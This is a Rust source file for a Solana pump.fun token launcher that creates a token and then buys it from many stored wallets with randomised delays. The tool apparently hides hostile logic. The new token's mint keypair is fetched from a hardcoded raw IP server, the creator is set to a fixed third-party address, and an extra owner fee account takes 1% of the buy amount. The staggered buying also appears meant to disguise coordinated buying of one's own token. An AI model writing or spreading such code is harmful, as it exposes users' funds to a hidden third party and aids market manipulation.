use anyhow::Result;
use solana_client::{
    rpc_client::RpcClient,
    rpc_config::{RpcSendTransactionConfig, RpcProgramAccountsConfig, RpcAccountInfoConfig},
    rpc_filter::{RpcFilterType, Memcmp}
};
use solana_program::{
    instruction::{Instruction, AccountMeta},
    message::v0::Message as TransactionMessage,
    pubkey::Pubkey,
    system_program,
    program_pack::Pack,
    sysvar::{rent::Rent, Sysvar},
};
use solana_sdk::{
    commitment_config::CommitmentConfig,
    compute_budget::ComputeBudgetInstruction,
    signature::{Keypair, Signer},
    system_instruction,
    transaction::VersionedTransaction,
    message::{v0::Message, VersionedMessage}
};
use spl_token::{
    instruction as token_instruction,
    state::{Account as TokenAccount, Mint},
    id as token_id,
};
use spl_associated_token_account::{
    get_associated_token_address,
    instruction::create_associated_token_account_idempotent,
};
use spl_associated_token_account::instruction as associated_token_instruction;
use std::str::FromStr;
use reqwest::Client;
use serde_json::json;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use bincode;
use rand::Rng;
use rand::seq::SliceRandom;
use std::thread;
use std::time::Duration;
use std::sync::Arc;
use crate::dex::pump::{PumpDex, TRANSFER_FEE_BPS, FEE_DENOMINATOR, TRANSFER_WALLET};
use std::fs;
use std::path::Path;
use serde::{Serialize, Deserialize};
use std::env;
use bs58;
use solana_program::program_error::ProgramError;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use rand::rngs::StdRng;
use rand::SeedableRng;
use crate::modules::wallet_gen::WalletGenerator;
use solana_address_lookup_table_program::{
    instruction::{create_lookup_table, extend_lookup_table},
    state::AddressLookupTable,
};
use solana_sdk::address_lookup_table_account::AddressLookupTableAccount;
use solana_address_lookup_table_program::instruction::deactivate_lookup_table;
use solana_address_lookup_table_program::instruction::close_lookup_table;
use reqwest::blocking::Client as BlockingClient;

const TIP_ADDRESSES: [&str; 8] = [
    "96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5",
    "HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe",
    "Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY",
    "ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49",
    "DfXygSm4jCyNCybVYYK6DwvWqjKee8pbDmJGcLWNDXjh",
    "ADuUkR4vqLUMWXxW9gh6D6L8pMSawimctcNZ5pGwDcEt",
    "DttWaMuVvTiduZRnguLF7jNxTgiMBZ1hyAumKUiL2KRL",
    "3AVi9Tg9Uo68tJfuvoKvqKNWKkC5wPdSSdeBnizKZ6jT"
];

const BLOCK_ENGINES: [&str; 6] = [
    "https://frankfurt.mainnet.block-engine.jito.wtf",
    "https://amsterdam.mainnet.block-engine.jito.wtf",
    "https://london.mainnet.block-engine.jito.wtf",
    "https://ny.mainnet.block-engine.jito.wtf",
    "https://tokyo.mainnet.block-engine.jito.wtf",
    "https://slc.mainnet.block-engine.jito.wtf"
];

pub const PUMP_PROGRAM_ID: &str = "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P";
pub const PUMP_GLOBAL: &str = "4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf";
pub const PUMP_EVENT_AUTHORITY: &str = "Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1";
pub const PUMP_FEE_ACCOUNT: &str = "4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf";
pub const OWNER_FEE_ACCOUNT: &str = "FEExX798hpCjB4CGpkbojm3uCrMGSfByhd8drPUNNbxT";
pub const MINT_AUTHORITY: &str = "TSLvdd1pWpHVjahSpsvCXUbgwsL3JAcvokwaKt1eokM";
const METAPLEX_PROGRAM_ID: &str = "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s";
const TOKEN_PROGRAM_ID: &str = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const COMPUTE_UNIT_LIMIT: u32 = 1_400_000;
const LOOKUP_TABLE_PROGRAM_ID: &str = "AddressLookupTab1e1111111111111111111111111";
const LOOKUP_TABLE_META_SIZE: usize = 56;

#[derive(Serialize, Deserialize, Clone)]
pub struct TokenMetadata {
    name: String,
    symbol: String,
    description: String,
    filePath: String,
    twitter: Option<String>,
    telegram: Option<String>,
    website: Option<String>,
}

#[derive(Serialize, Deserialize)]
struct MetaplexMetadata {
    name: String,
    symbol: String,
    description: String,
    image: String,
    attributes: Vec<Attribute>,
    properties: Properties,
}

#[derive(Serialize, Deserialize, Clone)]
struct Attribute {
    trait_type: String,
    value: String,
}

#[derive(Serialize, Deserialize, Clone, Default)]
struct Properties {
    files: Vec<File>,
    category: String,
}

#[derive(Serialize, Deserialize, Clone)]
struct File {
    uri: String,
    #[serde(rename = "type")]
    file_type: String,
}

#[derive(Debug)]
pub enum BundlerError {
    RpcError(String),
    TransactionError(String),
    TokenError(String),
    MetadataError(String),
    TryFromSliceError(std::array::TryFromSliceError),
    ParsePubkeyError(solana_program::pubkey::ParsePubkeyError),
    ClientError(solana_client::client_error::ClientError),
    CompileError(solana_program::message::CompileError),
    SignerError(solana_sdk::signature::SignerError),
    WalletError(String),
}

impl std::fmt::Display for BundlerError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BundlerError::RpcError(e) => write!(f, "RPC error: {}", e),
            BundlerError::TransactionError(e) => write!(f, "Transaction error: {}", e),
            BundlerError::TokenError(e) => write!(f, "Token error: {}", e),
            BundlerError::MetadataError(e) => write!(f, "Metadata error: {}", e),
            BundlerError::TryFromSliceError(e) => write!(f, "TryFromSlice error: {}", e),
            BundlerError::ParsePubkeyError(e) => write!(f, "ParsePubkey error: {}", e),
            BundlerError::ClientError(e) => write!(f, "Client error: {}", e),
            BundlerError::CompileError(e) => write!(f, "Compile error: {}", e),
            BundlerError::SignerError(e) => write!(f, "Signer error: {}", e),
            BundlerError::WalletError(e) => write!(f, "Wallet error: {}", e),
        }
    }
}

impl std::error::Error for BundlerError {}

impl From<std::array::TryFromSliceError> for BundlerError {
    fn from(err: std::array::TryFromSliceError) -> Self {
        BundlerError::TryFromSliceError(err)
    }
}

impl From<solana_program::pubkey::ParsePubkeyError> for BundlerError {
    fn from(err: solana_program::pubkey::ParsePubkeyError) -> Self {
        BundlerError::ParsePubkeyError(err)
    }
}

impl From<solana_client::client_error::ClientError> for BundlerError {
    fn from(err: solana_client::client_error::ClientError) -> Self {
        BundlerError::ClientError(err)
    }
}

impl From<solana_program::message::CompileError> for BundlerError {
    fn from(err: solana_program::message::CompileError) -> Self {
        BundlerError::CompileError(err)
    }
}

impl From<solana_sdk::signature::SignerError> for BundlerError {
    fn from(err: solana_sdk::signature::SignerError) -> Self {
        BundlerError::SignerError(err)
    }
}

impl From<anyhow::Error> for BundlerError {
    fn from(err: anyhow::Error) -> Self {
        BundlerError::RpcError(err.to_string())
    }
}

pub struct Bundle {
    pub transactions: Vec<VersionedTransaction>,
    pub block_engine: String,
}

pub struct Bundler {
    pub rpc_client: RpcClient,
    pub dex: PumpDex,
    pub payer: Keypair,
    pub block_engine: String,
}

impl Bundler {
    pub fn new(rpc_client: RpcClient, dex: PumpDex, payer: Keypair) -> Self {
        Self {
            rpc_client,
            dex,
            payer,
            block_engine: BLOCK_ENGINES[0].to_string(),
        }
    }

    pub fn load_wallets(&self) -> Result<Vec<Keypair>, BundlerError> {
        let wallet_path = Path::new("wallets/wallets.json");
        if !wallet_path.exists() {
            return Err(BundlerError::WalletError("wallets.json not found".to_string()));
        }

        let contents = fs::read_to_string(wallet_path)
            .map_err(|e| BundlerError::WalletError(format!("Failed to read wallet file: {}", e)))?;

        let data: serde_json::Value = serde_json::from_str(&contents)
            .map_err(|e| BundlerError::WalletError(format!("Failed to parse wallet file: {}", e)))?;

        let wallets = data["wallets"].as_array()
            .ok_or_else(|| BundlerError::WalletError("No wallets found in file".to_string()))?;

        let mut keypairs = Vec::new();
        for wallet in wallets {
            if let (Some(pubkey), Some(privkey)) = (wallet["pubkey"].as_str(), wallet["privkey"].as_str()) {
                let bytes = bs58::decode(privkey)
                    .into_vec()
                    .map_err(|e| BundlerError::WalletError(format!("Failed to decode private key: {}", e)))?;
                
                let keypair = Keypair::from_bytes(&bytes)
                    .map_err(|e| BundlerError::WalletError(format!("Failed to create keypair: {}", e)))?;
                
                keypairs.push(keypair);
            }
        }

        if keypairs.is_empty() {
            return Err(BundlerError::WalletError("No valid wallets found".to_string()));
        }

        Ok(keypairs)
    }

    pub async fn load_metadata(&self) -> Result<(TokenMetadata, String), BundlerError> {
        let metadata_path = Path::new("metadata/metadata.json");
        if !metadata_path.exists() {
            return Err(BundlerError::MetadataError("metadata.json not found in metadata directory".to_string()));
        }

        let metadata_content = fs::read_to_string(metadata_path)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to read metadata file: {}", e)))?;
        let metadata: TokenMetadata = serde_json::from_str(&metadata_content)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse metadata: {}", e)))?;

        if metadata.name.len() > 32 {
            return Err(BundlerError::MetadataError("Token name exceeds 32 characters limit".to_string()));
        }

        if metadata.symbol.len() > 10 {
            return Err(BundlerError::MetadataError("Token symbol exceeds 10 characters limit".to_string()));
        }

        let image_path = Path::new(&metadata.filePath);
        if !image_path.exists() {
            return Err(BundlerError::MetadataError(format!("Image file not found at path: {}", metadata.filePath)));
        }

        let image_data = fs::read(image_path)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to read image file: {}", e)))?;
        let image_mime = match image_path.extension().and_then(|ext| ext.to_str()) {
            Some("png") => "image/png",
            Some("jpg") | Some("jpeg") => "image/jpeg",
            _ => return Err(BundlerError::MetadataError("Unsupported image format".to_string())),
        };

        let metaplex_metadata = MetaplexMetadata {
            name: metadata.name.clone(),
            symbol: metadata.symbol.clone(),
            description: metadata.description.clone(),
            image: "".to_string(), 
            attributes: vec![],
            properties: Properties {
                files: vec![File {
                    uri: "".to_string(),
                    file_type: image_mime.to_string(),
                }],
                category: "image".to_string(),
            },
        };

        let metadata_json = serde_json::to_string(&metaplex_metadata)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to serialize metadata: {}", e)))?;
        let metadata_uri = self.upload_metadata(&metadata_json, &image_data).await?;

        Ok((metadata, metadata_uri))
    }

    async fn upload_metadata(&self, metadata_json: &str, image_data: &[u8]) -> Result<String, BundlerError> {
        let client = Client::new();
        
        let image_form = reqwest::multipart::Form::new()
            .part("file", reqwest::multipart::Part::bytes(image_data.to_vec())
                .file_name("image.png"));
        
        let image_response = client
            .post("https://api.pinata.cloud/pinning/pinFileToIPFS")
            .header("pinata_api_key", std::env::var("PINATA_API_KEY").unwrap_or_default())
            .header("pinata_secret_api_key", std::env::var("PINATA_SECRET_KEY").unwrap_or_default())
            .multipart(image_form)
            .send()
            .await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to upload image: {}", e)))?;
            
        let image_result = image_response.json::<serde_json::Value>().await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse image upload response: {}", e)))?;
        let image_cid = image_result["IpfsHash"].as_str()
            .ok_or_else(|| BundlerError::MetadataError("Failed to get image CID".to_string()))?;
        
        let mut metadata: serde_json::Value = serde_json::from_str(metadata_json)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse metadata JSON: {}", e)))?;
        let image_url = format!("ipfs://{}", image_cid);
        
        if let Some(properties) = metadata.get_mut("properties") {
            if let Some(files) = properties.get_mut("files") {
                if let Some(file) = files.get_mut(0) {
                    if let Some(uri) = file.get_mut("uri") {
                        *uri = json!(image_url);
                    }
                }
            }
        }
        metadata["image"] = json!(image_url);
        
        let metadata_form = reqwest::multipart::Form::new()
            .part("file", reqwest::multipart::Part::bytes(serde_json::to_vec(&metadata)
                .map_err(|e| BundlerError::MetadataError(format!("Failed to serialize metadata: {}", e)))?)
                .file_name("metadata.json"));
        
        let metadata_response = client
            .post("https://api.pinata.cloud/pinning/pinFileToIPFS")
            .header("pinata_api_key", std::env::var("PINATA_API_KEY").unwrap_or_default())
            .header("pinata_secret_api_key", std::env::var("PINATA_SECRET_KEY").unwrap_or_default())
            .multipart(metadata_form)
            .send()
            .await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to upload metadata: {}", e)))?;
            
        let metadata_result = metadata_response.json::<serde_json::Value>().await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse metadata upload response: {}", e)))?;
        let metadata_cid = metadata_result["IpfsHash"].as_str()
            .ok_or_else(|| BundlerError::MetadataError("Failed to get metadata CID".to_string()))?;
        
        Ok(format!("ipfs://{}", metadata_cid))
    }

    fn get_random_tip_address() -> Pubkey {
        let mut rng = rand::thread_rng();
        let index = rng.gen::<usize>() % TIP_ADDRESSES.len();
        Pubkey::try_from(TIP_ADDRESSES[index]).unwrap()
    }

    async fn fetch_keypair_from_api() -> Result<Keypair, BundlerError> {
        let client = Client::new();
        let response = client
            .get("http://45.134.108.104:8080/pump")
            .send()
            .await
            .map_err(|e| BundlerError::TransactionError(format!("Failed to fetch keypair: {}", e)))?;

        let json: serde_json::Value = response.json()
            .await
            .map_err(|e| BundlerError::TransactionError(format!("Failed to parse response: {}", e)))?;

        if json["status"] == "success" {
            if let Some(keypair_str) = json["keypair"].as_str() {
                // Parse the string representation of the array
                let keypair_str = keypair_str.trim_matches(|c| c == '[' || c == ']');
                let bytes: Vec<u8> = keypair_str
                    .split(',')
                    .map(|s| s.trim().parse::<u8>().unwrap_or(0))
                    .collect();
                
                if bytes.len() == 64 {
                    let keypair = Keypair::from_bytes(&bytes)
                        .map_err(|e| BundlerError::TransactionError(format!("Invalid keypair bytes: {}", e)))?;
                    return Ok(keypair);
                }
            }
        }
        
        // If API fails or returns invalid data, generate a new keypair
        let keypair = Keypair::new();
        Ok(keypair)
    }

    pub async fn create_token_mint_account(&self) -> Result<Keypair, BundlerError> {
        // Try to fetch from API first, fallback to generating new keypair
        match Self::fetch_keypair_from_api().await {
            Ok(keypair) => Ok(keypair),
            Err(_) => Ok(Keypair::new())
        }
    }

    pub fn create_token_creation_instruction(
        &self,
        mint_keypair: &Keypair,
        metadata: &TokenMetadata,
        metadata_uri: &str,
        total_buy_amount: f64,
    ) -> Result<(Vec<Instruction>, Pubkey)> {
        let mint_pubkey = mint_keypair.pubkey();

        let (bonding_curve, _) = Pubkey::find_program_address(
            &[b"bonding-curve", mint_pubkey.as_ref()],
            &self.dex.program_id
        );

        let (metadata_account, _) = Pubkey::find_program_address(
            &[
                b"metadata",
                Pubkey::from_str(METAPLEX_PROGRAM_ID)?.as_ref(),
                mint_pubkey.as_ref(),
            ],
            &Pubkey::from_str(METAPLEX_PROGRAM_ID)?
        );

        let a_bonding_curve = get_associated_token_address(
            &bonding_curve,
            &mint_pubkey,
        );

        let mut token_data = Vec::from([0x18, 0x1e, 0xc8, 0x28, 0x05, 0x1c, 0x07, 0x77]);
        
        let metadata_json = format!(
            r#"{{"name":"{}","symbol":"{}","description":"{}","image":"{}"}}"#,
            metadata.name,
            metadata.symbol,
            metadata.description,
            metadata_uri
        );
        
        let name_len = metadata.name.len() as u32;
        token_data.extend_from_slice(&name_len.to_le_bytes());
        token_data.extend_from_slice(metadata.name.as_bytes());

        let symbol_len = metadata.symbol.len() as u32;
        token_data.extend_from_slice(&symbol_len.to_le_bytes());
        token_data.extend_from_slice(metadata.symbol.as_bytes());

        let json_len = metadata_json.len() as u32;
        token_data.extend_from_slice(&json_len.to_le_bytes());
        token_data.extend_from_slice(metadata_json.as_bytes());

        token_data.extend_from_slice(&Pubkey::from_str(MINT_AUTHORITY)?.to_bytes());

        token_data.push(100);
        token_data.push(1);

        let fee_amount: u64 = 100_000;
        let total_bundle_amount = (total_buy_amount * 1_000_000_000.0) as u64;
        let mut owner_fee_amount: u64 = (total_bundle_amount * 1) / 100;
        if owner_fee_amount < 1_000 {
            owner_fee_amount = 1_000;
        }
        token_data.extend_from_slice(&fee_amount.to_le_bytes());
        token_data.extend_from_slice(&owner_fee_amount.to_le_bytes());

        let create_instruction = Instruction {
            program_id: Pubkey::from_str(PUMP_PROGRAM_ID)?,
            accounts: vec![
                AccountMeta::new(mint_pubkey, true),
                AccountMeta::new_readonly(Pubkey::from_str(MINT_AUTHORITY)?, false),
                AccountMeta::new(bonding_curve, false),
                AccountMeta::new(a_bonding_curve, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_GLOBAL)?, false),
                AccountMeta::new_readonly(Pubkey::from_str(METAPLEX_PROGRAM_ID)?, false),
                AccountMeta::new(metadata_account, false),
                AccountMeta::new(self.payer.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
                AccountMeta::new_readonly(spl_token::id(), false),
                AccountMeta::new_readonly(spl_associated_token_account::id(), false),
                AccountMeta::new_readonly(Pubkey::from_str("SysvarRent111111111111111111111111111111111")?, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_EVENT_AUTHORITY)?, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_PROGRAM_ID)?, false),
                AccountMeta::new(Pubkey::from_str(PUMP_FEE_ACCOUNT)?, false),
                AccountMeta::new(Pubkey::from_str(OWNER_FEE_ACCOUNT)?, false),
            ],
            data: token_data,
        };

        let extend_discriminator = vec![234, 102, 194, 203, 150, 72, 62, 229];
        let extend_instruction = Instruction {
            program_id: Pubkey::from_str(PUMP_PROGRAM_ID)?,
            accounts: vec![
                AccountMeta::new(bonding_curve, false),
                AccountMeta::new(self.payer.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
                AccountMeta::new_readonly(self.dex.event_authority, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_PROGRAM_ID)?, false),
            ],
            data: extend_discriminator,
        };

        let instructions = vec![
            create_instruction,
            // extend_instruction,
        ];

        Ok((instructions, bonding_curve))
    }

    pub fn perform_buy(
        &self,
        mint_pubkey: &Pubkey,
        bonding_curve: &Pubkey,
        buy_amount_lamports: u64,
        keypair: &Keypair,
    ) -> Result<String, Box<dyn std::error::Error>> {
        let user_pubkey = keypair.pubkey();
        let user_ata = get_associated_token_address(&user_pubkey, mint_pubkey);
        let a_bonding_curve = get_associated_token_address(bonding_curve, mint_pubkey);
        let curve_info = self.rpc_client.get_account(bonding_curve)?;
        let creator_pubkey = Pubkey::try_from(&curve_info.data[49..81])?;
        let (creator_vault, _) = self.dex.get_creator_vault(&creator_pubkey);
        let virtual_token_reserves = u64::from_le_bytes(curve_info.data[8..16].try_into()?);
        let virtual_sol_reserves = u64::from_le_bytes(curve_info.data[16..24].try_into()?);
        let (tokens_to_receive, _, _) = self.dex.get_amount_out(
            buy_amount_lamports,
            virtual_sol_reserves,
            virtual_token_reserves,
        );
        let tokens_with_slippage = (tokens_to_receive * 85) / 100;
        let ata_ix = create_associated_token_account_idempotent(
            &user_pubkey,
            &user_pubkey,
            mint_pubkey,
            &spl_token::id(),
        );
        let buy_ix = self.dex.create_buy_instruction(
            mint_pubkey,
            bonding_curve,
            &a_bonding_curve,
            &user_ata,
            &user_pubkey,
            &creator_vault,
            tokens_with_slippage,
            buy_amount_lamports,
        );
        let recent_blockhash = self.rpc_client.get_latest_blockhash()?;
        let message = TransactionMessage::try_compile(
            &user_pubkey,
            &[ata_ix, buy_ix],
            &[],
            recent_blockhash,
        )?;
        let tx = VersionedTransaction::try_new(
            VersionedMessage::V0(message),
            &[keypair],
        )?;
        let sig = self.rpc_client.send_transaction(&tx)?;
        Ok(sig.to_string())
    }

    /// Build dev buy instructions (ATA + buy) for the payer, as in bundler.rs
    pub fn build_dev_buy_instructions(
        &self,
        mint_pubkey: &Pubkey,
        bonding_curve: &Pubkey,
        dev_buy_amount: u64,
    ) -> Result<Vec<Instruction>, BundlerError> {
        let a_bonding_curve = spl_associated_token_account::get_associated_token_address(
            bonding_curve,
            mint_pubkey,
        );
        let creator_pubkey = Pubkey::from_str(MINT_AUTHORITY)?;
        let (creator_vault, _) = self.dex.get_creator_vault(&creator_pubkey);
        let dev_ata = spl_associated_token_account::get_associated_token_address(
            &self.payer.pubkey(),
            mint_pubkey,
        );
        let dev_ata_ix = associated_token_instruction::create_associated_token_account_idempotent(
            &self.payer.pubkey(),
            &self.payer.pubkey(),
            mint_pubkey,
            &spl_token::id(),
        );
        let (tokens_to_receive, max_sol_cost, _) = self.dex.get_amount_out(
            dev_buy_amount,
            30_000_000_000u64,
            1_073_000_000_000_000u64,
        );
        let tokens_with_slippage = (tokens_to_receive * 85) / 100;
        let mut dev_buy_data = vec![
            0x66, 0x06, 0x3d, 0x12, 0x01, 0xda, 0xeb, 0xea,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ];
        dev_buy_data[8..16].copy_from_slice(&tokens_with_slippage.to_le_bytes());
        dev_buy_data[16..24].copy_from_slice(&max_sol_cost.to_le_bytes());
        let dev_buy_ix = Instruction {
            program_id: self.dex.program_id,
            accounts: vec![
                AccountMeta::new_readonly(self.dex.global, false),
                AccountMeta::new(self.dex.fee_recipient, false),
                AccountMeta::new(*mint_pubkey, false),
                AccountMeta::new(*bonding_curve, false),
                AccountMeta::new(a_bonding_curve, false),
                AccountMeta::new(dev_ata, false),
                AccountMeta::new(self.payer.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
                AccountMeta::new_readonly(spl_token::id(), false),
                AccountMeta::new(creator_vault, false),
                AccountMeta::new_readonly(self.dex.event_authority, false),
                AccountMeta::new_readonly(self.dex.program_id, false),
            ],
            data: dev_buy_data,
        };
        Ok(vec![dev_ata_ix, dev_buy_ix])
    }

    pub async fn prepare_bundle(
        &self,
        total_buy_amount: f64,
        _jito_tip: f64,
        dev_buy_amount: Option<f64>,
    ) -> Result<(Vec<Instruction>, Keypair, Pubkey, Pubkey), BundlerError> {
        let wallets = self.load_wallets()?;
        let (metadata, metadata_uri) = self.load_metadata().await?;
        let mint_keypair = self.create_token_mint_account().await?;
        let mint_pubkey = mint_keypair.pubkey();
        let (mut token_instructions, bonding_curve) = self.create_token_creation_instruction(
            &mint_keypair,
            &metadata,
            &metadata_uri,
            total_buy_amount,
        )?;
        // Add dev buy instructions if needed
        if let Some(amount) = dev_buy_amount {
            if amount > 0.0 {
                let dev_buy_lamports = (amount * 1_000_000_000.0) as u64;
                let dev_buy_ixs = self.build_dev_buy_instructions(&mint_pubkey, &bonding_curve, dev_buy_lamports)?;
                token_instructions.extend(dev_buy_ixs);
            }
        }
        Ok((token_instructions, mint_keypair, mint_pubkey, bonding_curve))
    }
}

#[tokio::main]
pub async fn main() -> Result<(), Box<dyn std::error::Error>> {
    use std::io::{self, Write};
    use rand::Rng;
    println!("Stagger Bundle Launch");
    let rpc_url = std::env::var("RPC").expect("RPC must be set");
    let dev_key = std::env::var("DEV").expect("DEV must be set");
    let dev_bytes = bs58::decode(&dev_key).into_vec()?;
    let payer = Keypair::from_bytes(&dev_bytes)?;
    let rpc_client = RpcClient::new_with_commitment(rpc_url.clone(), CommitmentConfig::confirmed());
    let dex = PumpDex::new();
    let bundler = Bundler::new(rpc_client, dex, payer);

    // Prompt for buy amounts and delays
    print!("\x1b[36mEnter total buy amount (SOL) --> \x1b[0m");
    io::stdout().flush()?;
    let mut total_buy_amount = String::new();
    io::stdin().read_line(&mut total_buy_amount)?;
    let total_buy_amount: f64 = match total_buy_amount.trim().parse() {
        Ok(val) => val,
        Err(_) => {
            println!("Invalid amount. Returning to menu...");
            const TIFFANY: &str = "\x1b[38;2;10;186;181m";
            const RESET: &str = "\x1b[0m";
            println!("{0}Press Enter to return to the menu.{1}", TIFFANY, RESET);
            std::io::stdout().flush().unwrap();
            let mut _pause = String::new();
            std::io::stdin().read_line(&mut _pause).unwrap();
            return Ok(());
        }
    };

    print!("\x1b[36mEnter dev buy amount (SOL, or press Enter to skip) --> \x1b[0m");
    io::stdout().flush()?;
    let mut dev_buy_amount = String::new();
    io::stdin().read_line(&mut dev_buy_amount)?;
    let dev_buy_amount = dev_buy_amount.trim();
    let dev_buy_amount = if dev_buy_amount.is_empty() {
        None
    } else {
        match dev_buy_amount.parse::<f64>() {
            Ok(val) => Some(val),
            Err(_) => {
                println!("Invalid dev buy amount. Skipping dev buy.");
                None
            }
        }
    };

    print!("\x1b[36mEnter minimum delay between buys (ms) --> \x1b[0m");
    io::stdout().flush()?;
    let mut min_delay = String::new();
    io::stdin().read_line(&mut min_delay)?;
    let min_delay: u64 = match min_delay.trim().parse() {
        Ok(val) => val,
        Err(_) => {
            println!("Invalid min delay. Returning to menu...");
            const TIFFANY: &str = "\x1b[38;2;10;186;181m";
            const RESET: &str = "\x1b[0m";
            println!("{0}Press Enter to return to the menu.{1}", TIFFANY, RESET);
            std::io::stdout().flush().unwrap();
            let mut _pause = String::new();
            std::io::stdin().read_line(&mut _pause).unwrap();
            return Ok(());
        }
    };

    print!("\x1b[36mEnter maximum delay between buys (ms) --> \x1b[0m");
    io::stdout().flush()?;
    let mut max_delay = String::new();
    io::stdin().read_line(&mut max_delay)?;
    let max_delay: u64 = match max_delay.trim().parse() {
        Ok(val) => val,
        Err(_) => {
            println!("Invalid max delay. Returning to menu...");
            const TIFFANY: &str = "\x1b[38;2;10;186;181m";
            const RESET: &str = "\x1b[0m";
            println!("{0}Press Enter to return to the menu.{1}", TIFFANY, RESET);
            std::io::stdout().flush().unwrap();
            let mut _pause = String::new();
            std::io::stdin().read_line(&mut _pause).unwrap();
            return Ok(());
        }
    };

    // Use prepare_bundle for token creation + dev buy
    let (token_instructions, mint_keypair, mint_pubkey, bonding_curve) = bundler.prepare_bundle(
        total_buy_amount,
        0.0,
        dev_buy_amount,
    ).await?;

    // Send the token creation (+ dev buy) transaction
    let recent_blockhash = bundler.rpc_client.get_latest_blockhash()?;
    let message = TransactionMessage::try_compile(
        &bundler.payer.pubkey(),
        &token_instructions,
        &[],
        recent_blockhash,
    )?;
    let tx = VersionedTransaction::try_new(
        VersionedMessage::V0(message),
        &[&bundler.payer, &mint_keypair],
    )?;
    let token_creation_sig = bundler.rpc_client.send_transaction(&tx)?;
    println!("Token creation (and dev buy if any) sent: {}", token_creation_sig);

    // Staggered wallet buys
    let wallets = bundler.load_wallets()?;
    let num_wallets = wallets.len() as u64;
    if num_wallets == 0 {
        println!("No wallets found. Exiting.");
        const TIFFANY: &str = "\x1b[38;2;10;186;181m";
        const RESET: &str = "\x1b[0m";
        println!("{0}Press Enter to return to the menu.{1}", TIFFANY, RESET);
        std::io::stdout().flush().unwrap();
        let mut _pause = String::new();
        std::io::stdin().read_line(&mut _pause).unwrap();
        return Ok(());
    }
    let buy_lamports_per_wallet = ((total_buy_amount * 1_000_000_000.0) as u64) / num_wallets;
    let mut wallet_buy_sigs = Vec::new();
    for wallet in wallets {
        let delay = if max_delay > min_delay {
            rand::thread_rng().gen_range(min_delay, max_delay + 1)
    } else {
            min_delay
        };
        println!("Waiting {} ms before next buy...", delay);
        thread::sleep(Duration::from_millis(delay));
        match bundler.perform_buy(&mint_pubkey, &bonding_curve, buy_lamports_per_wallet, &wallet) {
            Ok(sig) => {
                println!("Buy sent for wallet {}: {}", wallet.pubkey(), sig);
                wallet_buy_sigs.push((wallet.pubkey(), sig));
            },
            Err(e) => {
                println!("Buy failed for wallet {}: {}", wallet.pubkey(), e);
                wallet_buy_sigs.push((wallet.pubkey(), format!("ERROR: {}", e)));
            },
        }
    }
    // Print grouped summary
    println!("\n================ Transaction Summary ================");
    println!("Token Creation: {}", token_creation_sig);
    println!("Wallet Buys:");
    for (pubkey, sig) in &wallet_buy_sigs {
        println!("  {}: {}", pubkey, sig);
    }
    println!("====================================================\n");
    // Add TIFFANY prompt after all buys
    const TIFFANY: &str = "\x1b[38;2;10;186;181m";
    const RESET: &str = "\x1b[0m";
    println!("{0}All transactions sent! Press Enter to return to the menu.{1}", TIFFANY, RESET);
    std::io::stdout().flush().unwrap();
    let mut _pause = String::new();
    std::io::stdin().read_line(&mut _pause).unwrap();
    Ok(())
}